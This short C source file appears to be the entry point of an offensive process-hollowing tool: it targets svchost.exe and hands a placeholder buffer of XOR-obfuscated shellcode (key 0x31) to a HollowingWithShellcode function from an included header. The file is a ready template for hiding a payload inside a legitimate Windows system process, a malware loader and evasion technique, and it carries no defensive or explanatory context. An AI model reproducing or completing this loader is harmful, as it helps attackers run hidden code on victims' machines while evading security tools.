#include "Hollowing.h"

int main() {
	WCHAR Target[] = L"C:\\Windows\\System32\\svchost.exe";

	// shellcode xored with 0x31
	unsigned char shellcodexored[] = "yourXOREDshellcode";

	HollowingWithShellcode((LPWSTR)Target, shellcodexored, sizeof(shellcodexored));
}
